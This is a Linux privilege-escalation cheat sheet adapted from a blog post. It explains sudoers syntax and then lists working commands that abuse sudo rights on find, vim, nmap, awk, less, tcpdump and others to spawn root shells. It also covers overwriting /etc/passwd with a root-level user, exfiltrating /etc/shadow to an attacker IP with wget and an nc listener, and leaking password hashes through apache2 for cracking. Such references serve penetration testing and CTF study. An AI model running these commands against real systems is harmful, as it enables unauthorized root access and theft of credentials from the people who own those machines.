---- Credits to Touhid M.Shaikh @ https://touhidshaikh.com/blog/?p=790 ----
---- Modified to add my own notes and formatting in ----


Sudoers File

    /etc/sudoers

Sudoer File Syntax.

    root ALL=(ALL) ALL

Explain 1: The root user can execute from ALL terminals, acting as ALL (any) users, and run ALL (any) command.

The first part is the user, the second is the terminal from where the user can use the sudocommand, the third part is which users he may act as, and the last one is which commands he may run when using.sudo

    user1 ALL= /sbin/poweroff
  
Explain 2: The above command, makes the user user1 can from any terminal, run the command power off using user1’s user password.

    user1 ALL = (root) NOPASSWD: /usr/bin/find
  
Explain 3:  The above command, make the user touhid can from any terminal, run the command find as root user without password.



Find out what SUDO permissions you have. The user may run these binary files without as root without password

    sudo -l

Also possible to check all files with SUID bits set with

        find / -perm -u=s -type f 2>/dev/null
        or
        find / -perm -4000 -type f 2>/dev/null


---- Listing ----

Here is a brief list of the exploitable binaries. Exact commands are in next section

    awk
    find
    less
    man
    more
    nano
    nmap
    wget
    vim

Secondary List, not tested

sudo mount -o bind /bin/bash /bin/mount
sudo mount


$ echo $’id\ncat /etc/shadow’ > /tmp/.test
$ chmod +x /tmp/.test
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

sudo strace -o/dev/null /bin/bash



---- Individual Commands ----



Using Find Command

    sudo find /etc/passwd -exec /bin/sh \;
    or

    sudo find /bin -name nano -exec /bin/sh \;

Using Vim Command

    sudo vim -c '!sh'
    
Using Nmap Command
Old way.

    sudo nmap --interactive
    nmap> !sh
    sh-4.1#
    Note : nmap –interactive option not available in latest nmap.

Latest Way without –interactive

    echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse


Using Man Command

    sudo man man

after that press !sh and hit enter


Using Less/More Command

    sudo less /etc/hosts
    sudo more /etc/hosts
    after that press !sh and hit enter


Using awk Command

    sudo awk 'BEGIN {system("/bin/sh")}'
 
Using nano Command
nano is text editor using this editor u can modify passwd file and add a user in passwd file as root privilege after that u need to switch user. Add this line in /etc/passwd to order to add the user as root privilege.

    sudo nano  /etc/passwd
    add this line:
    user1:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash


now switch user password with password : test

    su user1
    


Using wget Command
this very cool way which requires a Web Server to download a file. This way i never saw on anywhere. lets explain this.

On Attaker Side.

First Copy Target’s /etc/passwd file to attacker machine.
modify file and add a user in passwd file which is saved in the previous step to the attacker machine.
append this line only => 

    user1:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash

host that passwd file to using any web server.
On Victim Side.

    sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
    
now switch user password  : test

    su user1


Note: if u want to dump file from a server like a root’s ssh key, Shadow file etc.

    sudo wget --post-file=/etc/shadow 192.168.56.1:8080
    Setup Listener on attacker : nc –lvp 8080


---- Other ----
Using apache Command
sadly u cant get Shell and Cant edit system files.

but using this u can view system files.

    sudo apache2 -f /etc/shadow


Output is like this :

    Syntax error on line 1 of /etc/shadow:
    Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration


Sadly no Shell. But you manage to extract root hash now Crack hash in your machine. For Shadow Cracking click here for more.




Super long list here:

https://gtfobins.github.io/